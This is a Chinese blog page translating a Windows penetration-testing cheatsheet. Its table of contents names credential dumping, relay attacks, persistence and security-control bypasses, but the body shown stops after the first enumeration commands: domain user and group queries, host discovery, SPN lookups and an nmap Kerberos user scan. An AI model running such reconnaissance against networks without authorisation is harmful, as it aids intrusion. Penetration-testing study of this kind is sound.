<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>Windows Notes | madcoding’s blog</title><meta name="description" content="Windows Notes"><meta name="keywords" content="翻译文章,Windows"><meta name="author" content="madcoding"><meta name="copyright" content="madcoding"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="canonical" href="https://www.mad-coding.cn/2019/10/11/Windows-Notes/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Windows Notes"><meta name="twitter:description" content="Windows Notes"><meta name="twitter:image" content="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=2083938188,947746588&amp;fm=26&amp;gp=0.jpg"><meta property="og:type" content="article"><meta property="og:title" content="Windows Notes"><meta property="og:url" content="https://www.mad-coding.cn/2019/10/11/Windows-Notes/"><meta property="og:site_name" content="madcoding’s blog"><meta property="og:description" content="Windows Notes"><meta property="og:image" content="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=2083938188,947746588&amp;fm=26&amp;gp=0.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="prev" title="使用docker安装移动安全框架（MobSF）" href="https://www.mad-coding.cn/2019/10/11/使用docker安装移动安全框架（MobSF）/"><link rel="next" title="Linux Notes" href="https://www.mad-coding.cn/2019/10/11/Linux Notes/"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?4f375d7c7c0acbaae6032e476c824100";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://www.mad-coding.cn/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight_copy: 'true',
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: '添加书签',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天'

  
}</script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-列举"><span class="toc-text">0x01 列举</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-基本命令"><span class="toc-text">1.1 基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-具有SPN的用户"><span class="toc-text">1.1.1 具有SPN的用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-2-Kerberos枚举"><span class="toc-text">1.1.2 Kerberos枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-3-红队CSharp脚本"><span class="toc-text">1.1.3 红队CSharp脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-4-活动目录"><span class="toc-text">1.1.4 活动目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-5-从Linux-Box进行AD枚举-AD工具"><span class="toc-text">1.1.5 从Linux Box进行AD枚举-AD工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-6-SharpView枚举"><span class="toc-text">1.1.6 SharpView枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-7-SMB枚举"><span class="toc-text">1.1.7 SMB枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-8-SNMP枚举"><span class="toc-text">1.1.8 SNMP枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-9-MySQL枚举"><span class="toc-text">1.1.9 MySQL枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-10-DNS区域转移"><span class="toc-text">1.1.10 DNS区域转移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-11-LDAP"><span class="toc-text">1.1.11 LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-12-RPC枚举"><span class="toc-text">1.1.12 RPC枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-13-远程桌面"><span class="toc-text">1.1.13 远程桌面</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-文件传输"><span class="toc-text">0x02 文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-TFTP"><span class="toc-text">2.1 TFTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-FTP"><span class="toc-text">2.2 FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-VBS-Script"><span class="toc-text">2.3 VBS Script</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-Powershell"><span class="toc-text">2.4 Powershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-Powershell-Base64"><span class="toc-text">2.5 Powershell Base64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-安全复制-pscp-exe"><span class="toc-text">2.6 安全复制/ pscp.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-BitsAdmin-exe"><span class="toc-text">2.7 BitsAdmin.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-8-Remote-Desktop"><span class="toc-text">2.8 Remote Desktop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-9-WinHTTP-Com-Object"><span class="toc-text">2.9 WinHTTP Com Object</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-10-CertUtil"><span class="toc-text">2.10 CertUtil</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-11-Curl-Windows-1803"><span class="toc-text">2.11 Curl (Windows 1803+)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-12-SMB"><span class="toc-text">2.12 SMB</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-exploit"><span class="toc-text">0x03 exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-LLMNR-NBT-NS欺骗"><span class="toc-text">3.1 LLMNR / NBT-NS欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Responder-WPAD-Attack"><span class="toc-text">3.2 Responder WPAD Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-mitm6"><span class="toc-text">3.3 mitm6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-SCF文件攻击"><span class="toc-text">3.4 SCF文件攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-NTLM-Relay"><span class="toc-text">3.5 NTLM-Relay</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-私下交易"><span class="toc-text">3.6 私下交易</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-Exchange-Password-Spray"><span class="toc-text">3.7 Exchange Password Spray</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8-ExchangeRelayX"><span class="toc-text">3.8 ExchangeRelayX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-9-Exchange-Mailbox-Post-Compromise"><span class="toc-text">3.9 Exchange Mailbox Post-Compromise</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-10-CrackMapExec"><span class="toc-text">3.10 CrackMapExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-11-邮件狙击手"><span class="toc-text">3.11 邮件狙击手</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-12-Kerberos-Stuff"><span class="toc-text">3.12 Kerberos Stuff</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-13-MSSQL利用（PowerUpSQL）"><span class="toc-text">3.13 MSSQL利用（PowerUpSQL）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-14-Malicious-Macro-with-MSBuild"><span class="toc-text">3.14 Malicious Macro with MSBuild</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-15-WeirdHTA-Undetectable-HTA"><span class="toc-text">3.15 WeirdHTA - Undetectable HTA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-16-EvilWinRM"><span class="toc-text">3.16 EvilWinRM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-17-Meterpreter-Donut-Shellcode注入-NET"><span class="toc-text">3.17 Meterpreter + Donut-Shellcode注入.NET</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-特权提升"><span class="toc-text">0x04 特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-基本命令"><span class="toc-text">4.1 基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-PowerUp-ps1（有时是快速获胜）"><span class="toc-text">4.2 PowerUp.ps1（有时是快速获胜）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-锐化"><span class="toc-text">4.3 锐化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-如果是公元，引进猎狗犬…"><span class="toc-text">4.4  如果是公元，引进猎狗犬…</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-Bloodhound-Python"><span class="toc-text">4.5 Bloodhound-Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6-明文密码"><span class="toc-text">4.6 明文密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-7-查看已安装的软件"><span class="toc-text">4.7 查看已安装的软件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-8-弱文件夹权限"><span class="toc-text">4.8 弱文件夹权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-9-计划任务"><span class="toc-text">4.9 计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-10-Powershell历史"><span class="toc-text">4.10 Powershell历史</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-12-查看已连接的驱动器"><span class="toc-text">4.12 查看已连接的驱动器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-13-查看隐私"><span class="toc-text">4.13 查看隐私</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-14-还有其他人登录吗？"><span class="toc-text">4.14 还有其他人登录吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-15-查看注册表自动登录"><span class="toc-text">4.15 查看注册表自动登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-16-在凭据管理器中查看存储的凭据"><span class="toc-text">4.16 在凭据管理器中查看存储的凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-17-查看未引用的服务路径"><span class="toc-text">4.17 查看未引用的服务路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-18-查看启动项"><span class="toc-text">4.18 查看启动项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-19-检查AlwaysInstalledElevated注册表项"><span class="toc-text">4.19 检查AlwaysInstalledElevated注册表项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-20-注册表中有密码吗？"><span class="toc-text">4.20 注册表中有密码吗？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-21-剩余的任何Sysrep或无人参与文件"><span class="toc-text">4.21 剩余的任何Sysrep或无人参与文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-22-GPP（组策略首选项）密码"><span class="toc-text">4.22 GPP（组策略首选项）密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-23-转储Chrome密码（也发布漏洞利用程序）"><span class="toc-text">4.23 转储Chrome密码（也发布漏洞利用程序）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-24-转储KeePass"><span class="toc-text">4.24 转储KeePass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-25-令牌模拟"><span class="toc-text">4.25 令牌模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-26-多汁土豆"><span class="toc-text">4.26 多汁土豆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-27-烧烤"><span class="toc-text">4.27 烧烤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-28-用Python编写的"><span class="toc-text">4.28 用Python编写的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-29-代表烘焙"><span class="toc-text">4.29 代表烘焙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-30DCSync（也用于后期利用）"><span class="toc-text">4.30DCSync（也用于后期利用）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-exploit后"><span class="toc-text">0x05 exploit后</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-有用的命令"><span class="toc-text">5.1 有用的命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-Esenutl-exe转储锁定文件"><span class="toc-text">5.2 Esenutl.exe转储锁定文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-检查是否已启用Powershell日志记录"><span class="toc-text">5.3 检查是否已启用Powershell日志记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-Run-Seatbelt（绝对必须）"><span class="toc-text">5.4 Run Seatbelt（绝对必须）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-5-Dump-Creds"><span class="toc-text">5.5 Dump Creds</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-6-Dump-Creds-2"><span class="toc-text">5.6 Dump Creds #2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-7-SessionGopher"><span class="toc-text">5.7 SessionGopher</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-8-Dump-Chrome密码（也发布漏洞利用程序）"><span class="toc-text">5.8 Dump Chrome密码（也发布漏洞利用程序）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-9-Dump-Process-Memory-w-Mimikittenz"><span class="toc-text">5.9 Dump Process Memory w/ Mimikittenz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-10-Dump-KeePass"><span class="toc-text">5.10 Dump KeePass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-11-pypykatz"><span class="toc-text">5.11 pypykatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-12-SafetyKatz"><span class="toc-text">5.12 SafetyKatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-13-SharpDPAPI"><span class="toc-text">5.13 SharpDPAPI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-14-SharpSniper"><span class="toc-text">5.14 SharpSniper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-15-SharpLocker"><span class="toc-text">5.15 SharpLocker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-16-Check-for-Missing-KB’s"><span class="toc-text">5.16 Check for Missing KB’s</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-17-如果管理员-系统，则使用Mimikatz解密EFS文件"><span class="toc-text">5.17 如果管理员/系统，则使用Mimikatz解密EFS文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-18-UAC绕过"><span class="toc-text">5.18 UAC绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-19-Golden-Ticket-Attack"><span class="toc-text">5.19 Golden Ticket Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-20-子域将危害森林"><span class="toc-text">5.20 子域将危害森林</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-21-Dump-NTDS-dit"><span class="toc-text">5.21 Dump NTDS.dit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-22-SeBackupPrivlege-Dump-NTDS-dit"><span class="toc-text">5.22 SeBackupPrivlege - Dump NTDS.dit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-权限维持"><span class="toc-text">0x06 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-SSH-Shuttle"><span class="toc-text">6.1 SSH Shuttle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-SharPersist"><span class="toc-text">6.2 SharPersist</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-3-SharpDoor"><span class="toc-text">6.3 SharpDoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-4-自动运行注册表"><span class="toc-text">6.4 自动运行注册表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-5-Run-amp-Run-Once"><span class="toc-text">6.5 Run &amp; Run Once</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-6-计划任务"><span class="toc-text">6.6 计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-7-Windows启动文件夹"><span class="toc-text">6.7 Windows启动文件夹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-8-EXE-DLL劫持"><span class="toc-text">6.8 EXE / DLL劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-9-添加用户帐号"><span class="toc-text">6.9 添加用户帐号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-10-Kerberos的持久性"><span class="toc-text">6.10 Kerberos的持久性</span></a></li></ol></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-横向运动"><span class="toc-text">0x07 横向运动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-Plink"><span class="toc-text">7.1 Plink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-Powershell端口转发"><span class="toc-text">7.2 Powershell端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-3-Invoke-SocksProxy"><span class="toc-text">7.3 Invoke-SocksProxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-4-Socat-for-Windows"><span class="toc-text">7.4 Socat for Windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-5-SharpExec"><span class="toc-text">7.5 SharpExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-6-安全套接字漏斗"><span class="toc-text">7.6 安全套接字漏斗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）"><span class="toc-text">7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-8-CrackMapExec"><span class="toc-text">7.8 CrackMapExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-9-WMIC-Spawn-Process"><span class="toc-text">7.9 WMIC Spawn Process</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-10-WinRS"><span class="toc-text">7.10 WinRS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-11-Invoke-WMIExec-ps1"><span class="toc-text">7.11 Invoke-WMIExec.ps1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-12-Powershell调用命令（需要端口5985）"><span class="toc-text">7.12 Powershell调用命令（需要端口5985）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-13-PSExec"><span class="toc-text">7.13 PSExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-14-Powershell-Remoting"><span class="toc-text">7.14 Powershell Remoting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）"><span class="toc-text">7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-16-Pass-The-Hash"><span class="toc-text">7.16 Pass-The-Hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-17-Pass-The-Ticket"><span class="toc-text">7.17 Pass-The-Ticket</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-混淆-规避技术"><span class="toc-text">0x08 混淆/规避技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1-调用混淆"><span class="toc-text">8.1 调用混淆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-2-调用-CradleCraft"><span class="toc-text">8.2 调用-CradleCraft</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-3-调用DOSfuscation"><span class="toc-text">8.3 调用DOSfuscation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-4-Unicorn"><span class="toc-text">8.4 Unicorn</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-AppLocker-约束模式绕过"><span class="toc-text">0x09 AppLocker /约束模式绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#9-1-验证您是否处于受限模式"><span class="toc-text">9.1 验证您是否处于受限模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-2-Powershell非常少旁路"><span class="toc-text">9.2 Powershell非常少旁路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-3-世界可写文件夹（在Windows-10-1803上为默认）"><span class="toc-text">9.3 世界可写文件夹（在Windows 10 1803上为默认）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-4-降级攻击"><span class="toc-text">9.4 降级攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-5-AppLocker-COR配置文件绕过"><span class="toc-text">9.5 AppLocker COR配置文件绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-6-MSBuild-Powershell-CMD旁路"><span class="toc-text">9.6 MSBuild Powershell / CMD旁路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-7-PSAttack"><span class="toc-text">9.7 PSAttack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-8-NoPowerShell"><span class="toc-text">9.8 NoPowerShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-9-runDLL32绕过"><span class="toc-text">9.9 runDLL32绕过</span></a></li></ol></li></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=2083938188,947746588&amp;fm=26&amp;gp=0.jpg)"><div id="page-header"><span class="pull-left"> <a class="blog_title" id="site-name" href="/">madcoding’s blog</a></span><div class="open toggle-menu pull-right"><div class="menu-icon-first"></div><div class="menu-icon-second"></div><div class="menu-icon-third"></div></div><span class="pull-right menus"><div class="mobile_author_icon"><img class="lozad" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'"><div class="mobile_author-info__description">If you want to succeed, just do it.</div></div><hr><div class="menus_item"><a class="site-page" href="/ "><i class="fa-fw fa fa-home"></i><span> 首页</span></a><a class="site-page" href="/archives/"><i class="fa-fw fa fa-calendar"></i><span> 时间轴</span></a><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 类别</span></a><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> 读书</span></a><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-file-image-o"></i><span> 相册</span></a><a class="site-page" href="/pan/"><i class="fa-fw fa fa-hdd-o"></i><span> 资源</span></a><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a><a class="site-page" href="/留言板/"><i class="fa-fw fa fa-comment"></i><span> 留言板</span></a><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a><script>document.body.addEventListener('touchstart', function(){ });</script></div></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title"><div class="posttitle">Windows Notes</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-10-11<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2019-11-15</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/主机安全/">主机安全</a></span><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">9.1k</span><span class="post-meta__separator">|</span><span>阅读时长≈: 55 分钟</span><span class="post-meta__separator">|</span><span>℃: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文为翻译文章，为了记录在对Windows系统进行渗透测试过程中的一些命令和知识。</p>
<p>原文链接：<a href="https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html" target="_blank" rel="noopener">https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html</a></p>
<a id="more"></a>

<h1 id="0x01-列举"><a href="#0x01-列举" class="headerlink" title="0x01 列举"></a>0x01 列举</h1><h2 id="1-1-基本命令"><a href="#1-1-基本命令" class="headerlink" title="1.1 基本命令"></a>1.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">net users</span><br><span class="line">net users /domain</span><br><span class="line">net localgroup</span><br><span class="line">net groups /domain</span><br><span class="line">net groups /domain &quot;Domain Admins&quot;</span><br><span class="line"></span><br><span class="line">Get-ADUser</span><br><span class="line">Get-Domain</span><br><span class="line">Get-DomainUser</span><br><span class="line">Get-DomainGroup</span><br><span class="line">Get-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10</span><br><span class="line">Find-DomainShare</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Host Discovery</span><br><span class="line">netdiscover -r subnet/24</span><br><span class="line">nbtscan -r [range]</span><br><span class="line">for /L %i in (1,1,255) do  @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Reverse DNS Lookup</span><br><span class="line">$ComputerIPAddress = &quot;10.10.14.14&quot;</span><br><span class="line">[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/tevora-threat/SharpView" target="_blank" rel="noopener">https://github.com/tevora-threat/SharpView</a></p>
<h3 id="1-1-1-具有SPN的用户"><a href="#1-1-1-具有SPN的用户" class="headerlink" title="1.1.1 具有SPN的用户"></a>1.1.1 具有SPN的用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -SPN</span><br><span class="line"></span><br><span class="line">Get-ADComputer -filter &#123;ServicePrincipalName -like &lt;keyword&gt;&#125; -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,</span><br><span class="line">PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation</span><br></pre></td></tr></table></figure>

<h3 id="1-1-2-Kerberos枚举"><a href="#1-1-2-Kerberos枚举" class="headerlink" title="1.1.2 Kerberos枚举"></a>1.1.2 Kerberos枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&apos;test&apos;</span><br></pre></td></tr></table></figure>

